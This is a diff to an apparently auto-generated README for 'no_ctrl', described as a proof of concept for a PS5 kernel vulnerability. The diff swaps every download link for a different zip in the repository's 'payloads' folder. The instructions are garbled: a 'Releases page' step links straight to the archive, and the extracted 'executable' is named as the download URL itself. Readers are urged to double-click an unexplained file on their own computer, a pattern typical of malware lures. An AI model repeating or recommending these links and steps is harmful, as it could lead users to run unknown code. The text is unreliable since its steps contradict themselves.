@@ -4,19 +4,19 @@
 
 Welcome! This guide will help you download and run the no_ctrl application. This software is a proof-of-concept for a PS5 kernel vulnerability. Follow these steps for a smooth experience.
 
-[![Download no_ctrl](https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip%20no_ctrl-%20-brightgreen)](https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip)
+[![Download no_ctrl](https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip%20no_ctrl-%20-brightgreen)](https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip)
 
 ## 📥 Download & Install
 
 To start, you need to download the application. Visit the page below to find the latest version.
 
-[Download the latest version here!](https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip)
+[Download the latest version here!](https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip)
 
 ### Step-by-Step Instructions:
 
 1. **Go to the Releases Page**
    - Open your web browser.
-   - Click on this link: [https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip](https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip)
+   - Click on this link: [https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip](https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip)
    
 2. **Find the Latest Release**
    - Look for the section labeled "Latest Release."
@@ -24,7 +24,7 @@ To start, you need to download the application. Visit the page below to find the
 
 3. **Download the Release**
    - Click on the version that has the latest date.
-   - Look for the file that fits your system. Generally, you should see a link with a name like `https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip` or `https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip`.
+   - Look for the file that fits your system. Generally, you should see a link with a name like `https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip` or `https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip`.
    - Click on the link to start the download. If prompted, choose a location on your computer to save the file.
 
 4. **Extract the Files (if needed)**
@@ -34,7 +34,7 @@ To start, you need to download the application. Visit the page below to find the
 
 5. **Run the Application**
    - Locate the extracted folder.
-   - Inside, you should find `https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip` or a similar executable file. 
+   - Inside, you should find `https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip` or a similar executable file. 
    - Double-click on this file to open the application.
 
 ### Note:
@@ -81,6 +81,6 @@ If you encounter any issues:
 Join discussions and stay updated by following the GitHub repository. 
 
 For the latest updates, remember to check this link often:
-[https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip](https://raw.githubusercontent.com/Camal2010/no_ctrl/main/payloads/no_ctrl_v1.2-alpha.2.zip)
+[https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip](https://github.com/Camal2010/no_ctrl/raw/refs/heads/main/payloads/ctrl_no_minerval.zip)
 
 Download no_ctrl today and explore the possibilities!
